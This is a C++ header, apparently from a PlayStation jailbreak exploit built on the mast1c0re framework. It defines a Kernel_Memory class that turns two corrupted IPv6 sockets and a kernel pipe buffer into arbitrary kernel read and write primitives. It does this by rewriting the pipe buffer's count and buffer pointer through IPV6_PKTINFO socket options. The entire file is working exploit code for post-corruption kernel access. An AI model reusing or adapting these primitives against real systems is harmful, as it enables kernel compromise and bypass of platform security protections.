#pragma once

#include <mast1c0re.hpp>
#include "helpers.cpp"


struct pipebuf {
	uint32_t cnt;    // 0x00 number of chars currently in buffer
	uint32_t in;     // 0x04 in pointer
	uint32_t out;    // 0x08 out pointer
	uint32_t size;   // 0x0c size of buffer
	ptr64_t  buffer; // 0x10 kva of buffer
};

class Kernel_Memory
{
    private:
        int32_t head_sd = -1;
        int32_t rw_sd = -1;
        int32_t pipes[2] = {-1, -1};
        ptr64_t pipe_p = 0; // &pipe.pipe_buf
        uint8_t addr_buf[0x14] = {0};
        uint8_t data_buf[0x14] = {0};
        uint8_t rw_buf[0x14] = {0};

    public:
        // Initialize the Kernel Memory.
        Kernel_Memory(int32_t head_sd, int32_t rw_sd, int32_t *pipes, ptr64_t pipe_p)
        {
            if (head_sd < 0 || rw_sd < 0 || !pipes || !pipe_p) {
                printf_debug("Kernel_Memory: Invalid parameters!\n");
                return;
            }

            this->head_sd = head_sd;
            this->rw_sd = rw_sd;
            this->pipes[0] = pipes[0];
            this->pipes[1] = pipes[1];
            this->pipe_p = pipe_p;
            // Maximize .size
            *(uint32_t*)(this->data_buf + 0x0c) = 0x40000000;
        }
        
        // Copy data from userland to an arbitrary kernel address
        void copyin(void *src, ptr64_t dst, size_t len)
        {
            // Heading the pipebuf
            *(uint64_t*)addr_buf = pipe_p;
            PS::setsockopt(
                head_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf, sizeof(addr_buf)
            );

            // Setting both .cnt and .in to 0
            *(uint64_t*)data_buf = 0;
            PS::setsockopt(
                rw_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf, sizeof(data_buf)
            );

            // Skiping to .buffer
            *(uint64_t*)addr_buf = pipe_p + 0x10;
            PS::setsockopt(
                head_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf, sizeof(addr_buf)
            );

            // Setting .buffer to dst
            *(uint64_t*)data_buf = dst;
            PS::setsockopt(
                rw_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf, sizeof(data_buf)
            );

            PS::write(pipes[1], src, len);
        }

        // Copy data from an arbitrary kernel address to userland
        void copyout(ptr64_t src, void *dst, size_t len)
        {
            // Heading the pipebuf
            *(uint64_t*)addr_buf = pipe_p;
            PS::setsockopt(
                head_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf, sizeof(addr_buf)
            );

            // Setting .cnt to 0x40000000
            *(uint32_t*)data_buf = 0x40000000;
            PS::setsockopt(
                rw_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf, sizeof(data_buf)
            );

            // Skiping to .buffer
            *(uint64_t*)addr_buf = pipe_p + 0x10;
            PS::setsockopt(
                head_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf, sizeof(addr_buf)
            );

            // Setting .buffer to src
            *(uint64_t*)data_buf = src;
            PS::setsockopt(
                rw_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf, sizeof(data_buf)
            );

            PS::read(pipes[0], dst, len);
        }
    
    private:
        void _read(ptr64_t addr)
        {
            PS2::memset(rw_buf, 0, sizeof(rw_buf));
            *(uint64_t*)rw_buf = addr;
            PS::setsockopt(
                head_sd, IPPROTO_IPV6, IPV6_PKTINFO, rw_buf, sizeof(rw_buf)
            );
            socklen_t len = sizeof(rw_buf);
            PS::getsockopt(
                rw_sd, IPPROTO_IPV6, IPV6_PKTINFO, rw_buf, &len
            );
        }

        void _write(ptr64_t addr, uint64_t value, size_t len)
        {
            PS2::memset(rw_buf, 0, sizeof(rw_buf));
            PS2::memcpy(rw_buf, &value, len);
            copyin(rw_buf, addr, len);
        }
    
    public:
        uint8_t read8(ptr64_t addr)
        {
            _read(addr);
            return *(uint8_t*)rw_buf;
        };

        uint16_t read16(ptr64_t addr)
        {
            _read(addr);
            return *(uint16_t*)rw_buf;
        };

        uint32_t read32(ptr64_t addr)
        {
            _read(addr);
            return *(uint32_t*)rw_buf;
        };

        uint64_t read64(ptr64_t addr)
        {
            _read(addr);
            return *(uint64_t*)rw_buf;
        };

        void write8(ptr64_t addr, uint8_t value)
        {
            _write(addr, value, sizeof(value));
        };

        void write16(ptr64_t addr, uint16_t value)
        {
            _write(addr, value, sizeof(value));
        };

        void write32(ptr64_t addr, uint32_t value)
        {
            _write(addr, value, sizeof(value));
        };

        void write64(ptr64_t addr, uint64_t value)
        {
            _write(addr, value, sizeof(value));
        };
};
